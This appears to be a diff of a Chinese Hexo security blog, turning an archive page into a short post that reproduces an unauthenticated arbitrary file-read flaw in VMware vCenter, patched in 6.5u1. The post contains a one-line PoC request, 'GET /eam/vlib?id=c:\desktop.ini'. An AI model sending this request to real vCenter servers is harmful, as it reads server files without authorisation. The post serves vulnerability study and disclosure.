@@ -31,17 +31,22 @@
   </script>
 
 
-  <meta name="description" content="一点都对，半点都没错。">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Tpp_Tgg">
-<meta property="og:url" content="https://butnomingzi.github.io/archives/index.html">
+  <meta name="description" content="监测到twitter平台上，有人发出任意文件读取漏洞，目前暂未申请cve">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vmware Vcenter 任意文件读取">
+<meta property="og:url" content="https://butnomingzi.github.io/posts/69cd81e7/index.html">
 <meta property="og:site_name" content="Tpp_Tgg">
-<meta property="og:description" content="一点都对，半点都没错。">
+<meta property="og:description" content="监测到twitter平台上，有人发出任意文件读取漏洞，目前暂未申请cve">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/69cd81e7/img20201014073741.jpg">
+<meta property="article:published_time" content="2020-10-16T03:16:02.000Z">
+<meta property="article:modified_time" content="2020-10-16T03:25:02.987Z">
 <meta property="article:author" content="oudeniu">
+<meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://butnomingzi.github.io/posts/69cd81e7/img20201014073741.jpg">
 
-<link rel="canonical" href="https://butnomingzi.github.io/archives/">
+<link rel="canonical" href="https://butnomingzi.github.io/posts/69cd81e7/">
 
 
 <script id="page-configurations">
@@ -49,12 +54,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>归档 | Tpp_Tgg</title>
+  <title>Vmware Vcenter 任意文件读取 | Tpp_Tgg</title>
   
 
 
@@ -192,234 +197,150 @@
         <div class="content-wrap">
           
 
-          <div class="content archive">
+          <div class="content post posts-expand">
             
 
+    
   
   
-  
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        <span class="collection-header">嗯..! 目前共计 17 篇日志。 继续努力。</span>
-      </div>
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://butnomingzi.github.io/posts/69cd81e7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="oudeniu">
+      <meta itemprop="description" content="一点都对，半点都没错。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tpp_Tgg">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Vmware Vcenter 任意文件读取
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-10-16 11:16:02 / 修改时间：11:25:02" itemprop="dateCreated datePublished" datetime="2020-10-16T11:16:02+08:00">2020-10-16</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-users"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="firestore-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>554</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    <div class="collection-year">
-      <span class="collection-header">2020</span>
-    </div>
+        <p>监测到twitter平台上，有人发出任意文件读取漏洞，目前暂未申请cve</p>
+<a id="more"></a>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>VMware vCenterServer 提供了一个可伸缩、可扩展的平台，为 虚拟化管理奠定了基础。 VMware vCenter  Server（以前称为 VMware VirtualCenter），可集中管理 VMware vSphere  环境，与其他管理平台相比，极大地提高了 IT 管理员对虚拟环境的控制。<br> VMware vCenter Server：提高在虚拟基础架构每个级别上的集中控制和可见性，通过主动管理发挥 vSphere 潜能，是一个具有广泛合作伙伴体系支持的可伸缩、可扩展平台。</p>
+<p>监测到twitter平台上，有人发出任意文件读取漏洞，目前暂未申请cve</p>
+<p>6.5u1该漏洞被修复。</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;eam&#x2F;vlib?id&#x3D;c:\desktop.ini HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
 
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-10-16T11:16:02+08:00"
-              content="2020-10-16">
-          10-16
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/69cd81e7/" itemprop="url">
-            <span itemprop="name">Vmware Vcenter 任意文件读取</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-10-14T16:40:04+08:00"
-              content="2020-10-14">
-          10-14
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/6a0a2b53/" itemprop="url">
-            <span itemprop="name">我的Gitbook</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-09-22T17:43:49+08:00"
-              content="2020-09-22">
-          09-22
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/714a2891/" itemprop="url">
-            <span itemprop="name">cve-2020-5902 BIG-IP RCE漏洞复现</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-09-22T17:01:38+08:00"
-              content="2020-09-22">
-          09-22
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/f4b8e3a6/" itemprop="url">
-            <span itemprop="name">mimikatz利用zerologon攻击域控服务器相关命令（附蓝队自查方案)</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-09-21T17:42:02+08:00"
-              content="2020-09-21">
-          09-21
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/2c0d0e17/" itemprop="url">
-            <span itemprop="name">Hexo记录</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-09-21T15:03:49+08:00"
-              content="2020-09-21">
-          09-21
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/bb8356a5/" itemprop="url">
-            <span itemprop="name">Oracle小结</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-09-21T15:00:00+08:00"
-              content="2020-09-21">
-          09-21
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/6e52a8fb/" itemprop="url">
-            <span itemprop="name">sqlmap关于MSSQL执行命令思考</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-09-21T10:18:57+08:00"
-              content="2020-09-21">
-          09-21
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/8949441d/" itemprop="url">
-            <span itemprop="name">常用Proxy小结</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-09-21T10:17:49+08:00"
-              content="2020-09-21">
-          09-21
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/a1b49219/" itemprop="url">
-            <span itemprop="name">Github语法</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-09-21T10:16:49+08:00"
-              content="2020-09-21">
-          09-21
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/posts/6b303458/" itemprop="url">
-            <span itemprop="name">通达OA 任意文件上传+文件包含 RCE</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
+<p><img src="/posts/69cd81e7/img20201014073741.jpg"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
+<p>We found an Unauthenticated Arbitrary File Read vulnerability in  VMware vCenter. VMware revealed that this vulnerability was patched in  6.5u1, but no CVE was assigned.</p>
+</blockquote>
+<blockquote>
+<p>The PoC ️ <span class="exturl" data-url="aHR0cHM6Ly90LmNvL0xmdmJ5QlVoRjU=">https://t.co/LfvbyBUhF5<i class="fa fa-external-link-alt"></i></span></p>
+</blockquote>
 
     </div>
-  </div>
-  
-  
-  
 
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>oudeniu
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://butnomingzi.github.io/posts/69cd81e7/" title="Vmware Vcenter 任意文件读取">https://butnomingzi.github.io/posts/69cd81e7/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"><i class="fa fa-tag"></i> 漏洞复现</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/6a0a2b53/" rel="prev" title="我的Gitbook">
+      <i class="fa fa-chevron-left"></i> 我的Gitbook
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
   
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="extend next" rel="next" href="/archives/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
-  </nav>
+  
+  
 
 
 
@@ -471,6 +392,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC"><span class="nav-number">2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
